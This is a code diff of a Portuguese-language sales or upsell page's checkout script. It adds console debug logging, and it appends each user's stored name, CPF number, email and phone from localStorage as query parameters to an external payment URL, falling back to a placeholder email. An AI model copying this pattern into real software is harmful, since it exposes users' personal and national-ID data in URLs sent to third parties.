@@ -139,18 +139,62 @@
         </div>
     </div>
     <script>
-        function checkout(event) {
-          event.preventDefault();
-      
-          // Captura todos os parâmetros da URL atual
-          const currentParams = window.location.search;
-      
-          // Constrói a URL de destino incluindo os mesmos parâmetros
-          const destino = "https://pay.novopagamentooseguro.com/checkout/d7bebdab-107a-4ce9-ba72-93e602c0523f" + currentParams;
-      
-          // Redireciona
-          window.location.href = destino;
+            // Debug: Log dos parâmetros recebidos na página up5
+            console.log('=== DEBUG UP5 PAGE ===');
+            console.log('URL atual:', window.location.href);
+            console.log('Parâmetros recebidos:', window.location.search);
+            if (window.location.search) {
+                console.log('Parâmetros parseados:', new URLSearchParams(window.location.search));
+            }
+        </script>
+    <script>
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
         }
-      </script>
+
+        function buildUrlWithParams(baseUrl) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl);
+            Object.keys(params).forEach(key => {
+                url.searchParams.append(key, params[key]);
+            });
+            
+            return url.toString();
+        }
+
+        function checkout(event) {
+            event.preventDefault();
+            
+            try {
+                const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario')) || {};
+                const email = localStorage.getItem('email') || '';
+                const telephone = localStorage.getItem('telephone') || '';
+                
+                const baseUrl = 'https://pay.novopagamentooseguro.com/checkout/d7bebdab-107a-4ce9-ba72-93e602c0523f';
+                const url = new URL(baseUrl);
+                
+                // Adicionar parâmetros do usuário
+                url.searchParams.append('name', dadosUsuario.NOME || '');
+                url.searchParams.append('document', dadosUsuario.CPF || '');
+                url.searchParams.append('email', email || 'useraleatorio@gmail.com');
+                url.searchParams.append('telephone', telephone || '');
+                
+                // Adicionar parâmetros da URL atual usando a função buildUrlWithParams
+                const finalUrl = buildUrlWithParams(url.toString());
+                
+                window.location.href = finalUrl;
+            } catch(err) {
+                console.error('Erro ao redirecionar:', err);
+                window.location.href = buildUrlWithParams('https://pay.novopagamentooseguro.com/checkout/d7bebdab-107a-4ce9-ba72-93e602c0523f');
+            }
+        }
+    </script>
 
 </body></html>
